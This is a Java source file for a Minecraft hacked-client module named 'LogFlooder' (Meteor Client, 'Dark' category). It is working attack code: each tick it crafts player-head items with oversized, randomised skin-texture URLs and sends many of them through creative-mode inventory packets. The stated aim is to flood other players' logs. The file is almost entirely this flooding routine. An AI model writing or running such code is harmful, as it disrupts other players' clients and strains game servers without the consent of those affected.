/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package meteordevelopment.meteorclient.systems.modules.Dark;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtIntArray;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;

import java.util.Base64;
import java.util.Random;

public class LogFlooder extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Slot> slot = sgGeneral.add(new EnumSetting.Builder<Slot>()
        .name("slot")
        .description("Which slot to use.")
        .defaultValue(Slot.First)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(5)
        .min(1)
        .sliderMin(1)
        .sliderMax(200)
        .build()
    );

    private final Setting<Integer> size = sgGeneral.add(new IntSetting.Builder()
        .name("size")
        .description("The size of the skull's URL")
        .defaultValue(500)
        .min(1)
        .sliderMin(1)
        .sliderMax(2000)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    public LogFlooder() {
        super(Categories.Dark, "log-flooder", "Attempts to flood a player's logs.");
    }

    @Override
    public void onActivate() {
        if (!mc.player.getAbilities().creativeMode) {
            error("You must be in creative mode to use this.");
            toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        for (int i = 0; i < amount.get(); i++) {
            ItemStack stack = new ItemStack(Items.PLAYER_HEAD);
            NbtCompound tag = new NbtCompound();
            NbtCompound skullOwner = new NbtCompound();
            skullOwner.put("Id", new NbtIntArray(new int[]{1044599774, -91344643, -1626455549, -827872364}));
            skullOwner.put("Name", NbtString.of("Divine" + new Random().nextInt(50000)));
            NbtCompound textures = new NbtCompound();
            NbtList list = new NbtList();
            NbtCompound value = new NbtCompound();
            String texture = "{\"textures\":{\"SKIN\":{\"url\":\"https://education.minecraft.net/wp-content/uploads/" + "Hiii".repeat(size.get()) + new Random().nextInt(5000000) + ".png\"}}}";
            value.put("Value", NbtString.of(Base64.getEncoder().encodeToString(texture.getBytes())));
            list.add(value);
            textures.put("textures", list);
            skullOwner.put("Properties", textures);
            tag.put("SkullOwner", skullOwner);
            stack.setNbt(tag);
            switch (slot.get()) {
                case First -> mc.interactionManager.clickCreativeStack(stack, 36);
                case Offhand -> mc.interactionManager.clickCreativeStack(stack, 45);
                case Helmet -> mc.interactionManager.clickCreativeStack(stack, 5);
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Slot {
        First,
        Offhand,
        Helmet
    }
}

